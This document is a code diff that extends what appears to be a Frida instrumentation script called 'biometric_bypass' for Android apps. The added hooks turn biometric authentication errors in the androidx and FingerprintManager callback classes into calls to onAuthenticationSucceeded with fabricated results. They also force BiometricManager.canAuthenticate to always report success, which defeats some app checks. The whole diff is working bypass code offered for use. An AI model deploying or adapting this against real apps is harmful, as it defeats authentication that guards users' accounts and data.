@@ -74,5 +74,49 @@ Java.perform(function () {
     });
   });
 
+  // ---- E10: exception-handling variant -------------------------------
+  // Some apps subclass BiometricPrompt$AuthenticationCallback and put
+  // detection logic in onAuthenticationError (the wrong place for it).
+  // Reroute the error callback to fire onAuthenticationSucceeded instead.
+  safe("androidx.biometric.BiometricPrompt$AuthenticationCallback.onAuthenticationError -> Succeeded", function () {
+    var CB = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
+    CB.onAuthenticationError.implementation = function (errorCode, errString) {
+      send("[biometric_bypass] AuthenticationCallback.onAuthenticationError swallowed (code=" + errorCode + ")");
+      try {
+        var Result = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
+        var fake = Result.$new(null, 2);  // 2 == AUTHENTICATION_RESULT_TYPE_BIOMETRIC
+        this.onAuthenticationSucceeded(fake);
+      } catch (e) {
+        send("[biometric_bypass] could not synthesise success in error handler: " + e);
+      }
+    };
+  });
+
+  safe("android.hardware.fingerprint.FingerprintManager$AuthenticationCallback.onAuthenticationError -> Succeeded", function () {
+    var CB = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationCallback");
+    CB.onAuthenticationError.implementation = function (errorCode, errString) {
+      send("[biometric_bypass] FingerprintManager$AuthenticationCallback.onAuthenticationError swallowed (code=" + errorCode + ")");
+      try {
+        var Result = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationResult");
+        var fake = Result.$new(null, null, 0);
+        this.onAuthenticationSucceeded(fake);
+      } catch (e) {
+        send("[biometric_bypass] could not synthesise success in error handler: " + e);
+      }
+    };
+  });
+
+  // Apps that detect Frida by catching IllegalStateException out of
+  // BiometricManager#canAuthenticate(): force it to always return
+  // BIOMETRIC_SUCCESS (=0) regardless of platform state.
+  safe("androidx.biometric.BiometricManager.canAuthenticate -> 0", function () {
+    var BM = Java.use("androidx.biometric.BiometricManager");
+    BM.canAuthenticate.overloads.forEach(function (overload) {
+      overload.implementation = function () {
+        return 0;
+      };
+    });
+  });
+
   send("[biometric_bypass] ready");
 });
